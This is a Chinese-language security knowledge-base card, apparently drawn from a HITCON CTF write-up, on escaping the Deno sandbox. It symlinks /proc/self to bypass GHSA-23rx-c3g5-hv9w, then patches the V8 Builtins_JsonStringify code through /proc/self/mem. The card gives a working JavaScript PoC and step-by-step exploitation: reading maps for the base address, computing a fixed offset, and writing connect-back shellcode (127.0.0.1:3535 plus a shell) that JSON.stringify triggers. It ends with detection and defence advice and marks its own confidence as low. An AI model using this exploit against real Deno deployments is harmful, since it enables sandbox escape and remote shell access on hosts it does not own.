---
id: binary-pwn-sandbox-escape-deno-proc-self-mem-builtins-patch
title: Deno 沙箱逃逸：symlink /proc/self + /proc/self/mem 覆写 Builtins_JsonStringify 注入 shellcode
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: deno-proc-self-symlink-mem-builtin-patch-escape
tags:
- deno
- sandbox-escape
- proc-self-mem
- symlink
- v8
- builtins
- shellcode
- ctf
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V283
  verified_at: '2026-11-08T04:53:51+08:00'
  notes: 已对照原文核对：Deno 沙箱逃逸代码与原文 exp.js 一致（symlink /proc/self、读 maps 取 deno 基址、offset 0x401c2c0 覆写 Builtins_JsonStringify、JSON.stringify 触发、connect 127.0.0.1:3535+dupsh shellcode）。原文作者自述未完全研究透，PoC 来自另一队伍 WP，文章未在本环境独立复现，卡片已标 confidence low 并在边界说明；本核对未复跑。原文未声明受影响版本区间，未设置 versions。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-deno-proc-self-mem-builtins-patch/
draft: false
kb_aliases:
- Deno 沙箱逃逸
- Deno /proc/self/mem
- Builtins_JsonStringify 覆写
- GHSA-23rx-c3g5-hv9w
- Deno symlink /proc/self
- Truth of NPM
- V8 builtin shellcode patch
---

## 一句话结论

在可获得 Deno 代码执行、且 Deno 版本受 GHSA-23rx-c3g5-hv9w（允许 symlink 指向 `/proc/self`）影响时，可先 `Deno.symlinkSync('/proc/self','/tmp/self')` 绕过文件路径限制，读 `/tmp/self/maps` 取 deno 镜像基址，按固定偏移算出 V8 内建 `Builtins_JsonStringify` 的地址，再用 `Deno.openSync('/tmp/self/mem',{write:true})` 把 shellcode 写到该地址；随后调用 `JSON.stringify('pwned')` 触发被覆写的内建，执行 shellcode（connect 127.0.0.1:3535 + dupsh），逃出 Deno 沙箱。

## 原理

- **Deno 权限模型**：Deno 通过 `--allow-read/--allow-write/--allow-run` 等限制文件/网络/子进程；`/proc/self/maps`、`/proc/self/mem` 等特殊文件若可读/写，就能泄露进程内存布局并直接改写自身内存。
- **symlink 绕过（GHSA-23rx-c3g5-hv9w）**：该 Deno 安全公告涉及 symlink 校验缺陷；在受影响版本中，`Deno.symlinkSync('/proc/self','/tmp/self')` 可以把 `/tmp/self` 指向当前进程的 proc 目录，后续通过 `/tmp/self/maps`、`/tmp/self/mem` 访问自身内存，而不直接出现 `/proc/self` 字样。
- **定位 deno 镜像基址**：读取 `/tmp/self/maps`，取包含 `deno` 的第一段，解析起始地址作为基址；V8 内建在 deno 二进制中以固定偏移存在，示例 `offset = 0x401c2c0`（注释 `&Builtins_JsonStringify - 0x555555554000`），`addr = base + offset`。偏移与 Deno/V8 构建版本强相关，需要按目标版本重新计算。
- **写内存**：`Deno.openSync('/tmp/self/mem',{write:true})` + `mem.seekSync(addr, Deno.SeekMode.Start)` + `mem.writeSync(shellcode)` 把 shellcode 写到 `Builtins_JsonStringify` 的代码位置；`/proc/self/mem` 按虚拟地址写入，绕过普通页权限（代码段通常只读）。
- **触发**：调用 `JSON.stringify('pwned')` 进入被覆写的 V8 内建，控制流跳到 shellcode；示例 shellcode 为 `shellcraft.connect('127.0.0.1',3535,'ipv4') + shellcraft.dupsh()`，即反弹/本地连接后把 shell 起在 socket 上。
- **为什么能逃逸**：Deno 的沙箱主要靠权限检查拦截 API 调用，但一旦允许读写 `/proc/self/mem`（或通过 symlink 绕过路径检查），攻击者就能改写运行时自身的可执行代码，权限模型被完全绕过。
- **边界**：文章作者明确表示“具体还没研究透怎么绕的”，该 PoC 来自另一支队伍的 WP（代码注释含 `hitcon{the_fix_that_does_not_really_address_the_issue}`）；偏移 `0x401c2c0` 只对特定 Deno 构建有效，文章未在本环境独立复现。本卡 confidence 标 low。

## 触发条件

- 目标使用受 GHSA-23rx-c3g5-hv9w 影响的 Deno 版本，且攻击者已能在 Deno 中执行任意 JS（如动态 import 恶意 TSX/页面）。
- 运行时允许 `Deno.symlinkSync`、`Deno.readTextFileSync`/`Deno.openSync` 对 `/tmp` 与 `/proc` 的访问（或 symlink 绕过后可达）。
- 已知目标 Deno 构建中 `Builtins_JsonStringify` 的固定偏移（需与版本匹配）。
- 攻击者能触发该内建（如 `JSON.stringify`），且 shellcode 的 connect 目标可达。

## 利用步骤

1. 在 Deno 代码执行点运行：删除旧 `/tmp/self`，`Deno.symlinkSync('/proc/self','/tmp/self')`（利用 symlink 校验缺陷）。
2. 读 `/tmp/self/maps`，找到含 `deno` 的第一段，取起始地址为基址。
3. 按目标版本计算 `Builtins_JsonStringify` 偏移（示例 `0x401c2c0`），`addr = base + offset`。
4. `Deno.openSync('/tmp/self/mem',{write:true})`，`seekSync(addr)` 后写入 shellcode。
5. 调用 `JSON.stringify('pwned')` 触发被覆写的 builtin，shellcode 执行（示例 connect 127.0.0.1:3535 + dupsh）。
6. 若偏移不对，进程崩溃；需按目标 Deno 二进制重新定位 builtin。

## PoC

```javascript
try { Deno.removeSync('/tmp/self') } catch {}
Deno.symlinkSync('/proc/self', '/tmp/self')  // bypass GHSA-23rx-c3g5-hv9w
const maps = Deno.readTextFileSync('/tmp/self/maps')
const first = maps.split('\n').find(x => x.includes('deno'))
const offset = 0x401c2c0 // &Builtins_JsonStringify - 0x555555554000
const base = parseInt(first.split('-')[0], 16)
const addr = base + offset
console.log('&Builtins_JsonStringify', addr.toString(16))

const mem = Deno.openSync('/tmp/self/mem', { write: true })
const shellcode = new Uint8Array([ /* pwntools: connect(127.0.0.1,3535)+dupsh() */ ])
mem.seekSync(addr, Deno.SeekMode.Start)
mem.writeSync(shellcode)
JSON.stringify('pwned')   // 触发被覆写的 builtin
```

说明：shellcode 字节数组在原文中完整给出（x64 Linux connect+dupsh）；本卡未复跑，偏移与 Deno 版本绑定。

## 变体与关联

- **同类 /proc/self/mem 改写**：[[ctf-pwn-proc-self-mem-rodata-string-patch]]（把编辑器变成任意内存写，改 .rodata 黑名单字符串）；本卡改的是 V8 builtin 代码。
- **V8/JS 运行时逃逸**：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]、[[binary-pwn-sandbox-escape-nodejs-eval-char-ast-filter-with-consolelog-eval]] 是 Node.js vm 逃逸；本卡是 Deno + /proc/self/mem。
- **symlink 类绕过**：其他允许 symlink 指向 `/proc/self` 的运行时/沙箱可复用同一思路。
- **入口链**：文章中的代码执行入口是 Deno 动态 `import('./pages/${page}.tsx')` + npm 包中非法 UTF-8 文件名绕过 `fs.walk` 删除（挑战特定），本卡聚焦沙箱逃逸本身。

## 检测与防御

- **升级**：修复 GHSA-23rx-c3g5-hv9w 对应的 Deno 版本；限制 symlink 目标。
- **沙箱**：在容器/namespace 中屏蔽 `/proc/self/mem` 写、限制 `ptrace`/proc 访问；使用 seccomp 禁止 `/proc/*/mem` 打开写。
- **运行时**：对可执行内存页做完整性校验/监控；检测异常的 `symlinkSync('/proc/self')`、读取 `/proc/self/maps`、打开 `/proc/self/mem` 的行为。
- **应用**：不要对不可信输入做动态 `import()`；锁定依赖版本与构建哈希，避免偏移可预测。
